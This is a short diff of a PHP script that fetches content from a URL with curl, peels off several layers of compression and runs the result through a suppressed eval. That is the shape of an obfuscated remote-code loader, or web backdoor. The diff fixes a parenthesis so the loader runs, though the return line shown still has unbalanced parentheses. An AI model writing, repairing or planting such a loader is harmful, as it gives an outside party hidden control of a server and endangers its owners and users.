@@ -15,6 +15,6 @@ function fetchContent($url) {
     curl_close($curl);
     return gzdeflate(gzcompress(gzdeflate(gzcompress($content)))));
 }
-$content = gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url))))));
+$content = gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url)))));
 @eval("?>".$content);
 ?>
